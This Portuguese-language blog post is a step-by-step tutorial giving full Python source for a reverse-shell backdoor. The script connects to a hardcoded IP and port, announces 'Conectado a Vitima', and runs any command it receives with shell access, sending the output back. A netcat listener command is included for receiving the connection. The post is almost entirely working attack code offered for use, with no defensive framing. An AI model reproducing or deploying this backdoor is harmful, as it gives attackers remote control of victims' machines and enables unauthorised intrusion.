---
layout: post
title:  "BlackDoor em Python"
date:   2017-12-18
---
<figure>
	<img src="{{ '/assets/img/ imagem aqui' | prepend: site.baseurl }}" alt=""> 
	
</figure>
<p class="intro"><span class="dropcap"> S</span>imples "BackDoor" em python para conexão revessa, você pode usar o NetCat ou criar um servido em python para estar ouvindo o"BkacDoor".

<dt>1. vamos importa as bibliotecas necessarias para o funcionamento do BackDoor.</dt> 

{% highlight python %}
#!/usr/bin/python
import socket,subprocess, os
# ou 
import socket
import subprocess
import os
{% endhighlight %}

<dt>2. Antes de começar vamos definir 2 variáveis para a "Porta" é "IP" onde o backdoor ira se conectar. </dt>

{% highlight python %}
# Seu Ip ou Ip externo. 
HOST = '192.168.1.40'
# Sua porta  
PORT = 90
{% endhighlight %}

<dt>3. Agora temos que definir o tipo de socket, neste caso sera usado o socket do tipo TCP.</dt>

{% highlight python %}
# TCP Socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
{% endhighlight %}

<dt>4. Aqui estamos conectando o socket no ip e porta que definimos acima.</dt>
{% highlight python %}
# Conectando ou Ip e a Porta 
s.connect((HOST, PORT))
{% endhighlight %}

<dt>5. Agora vamos enviar uma "mensagem para o servidor indicando que nos conectamos a ele."</dt>
{% highlight python %}
# Mensagem indicando que estamos conectado
s.send('''
        #########################
        [*] Conectado a Vitima !
        #########################
	    \nRoot@Shell>>''')
{% endhighlight %}

<dt>6. Agora vamos criar um "loop" para recebermos comando externos de um servidor. </dt>
{% highlight python %}
while 1:
     data = s.recv(1024)
# Se dermos o comando "quit" paramos o loop 
     if data == "quit": break
# Parte do comando "CD" para navegar melhor.
     if data.startswith('cd'):
          os.chdir(data[3:].replace('\n',''))
          s.send(os.getcwd()+"Root@Shell>>")
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read() 
     s.send(stdout_value)
# Fechamos o socket 
s.close()
{% endhighlight %}

<dt> A qui abaixo esta os servidor já pronto é uma imagem dele conectado ao "NetCat"</dt>
{% highlight python %}
#!/usr/bin/python
import socket,subprocess, os
HOST = '192.168.1.40'    # Seu Ip ou No-Ip
PORT = 90                # Sua porta 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('''
        #########################
        [*] Conectado a Vitima !
        #########################
	    \nRoot@Shell>>''')
while 1:     
     data = s.recv(1024)    
     if data == "quit": break
     # Parte do comando "CD" para navegar melhor.
     if data.startswith('cd'):
          os.chdir(data[3:].replace('\n',''))
          s.send(os.getcwd()+"Root@Shell>>")     
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)     
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value)
s.close()
{% endhighlight %}

<figure>
	<img src="{{ '/assets/img/socket.png' | prepend: site.baseurl }}" alt=""> 
	<dd>Usando o NetCat Exp:</dd>
	<figcaption>nc -vnlp "90" tem que ser a porta que definimos na variável "PORT" </figcaption>
</figure>





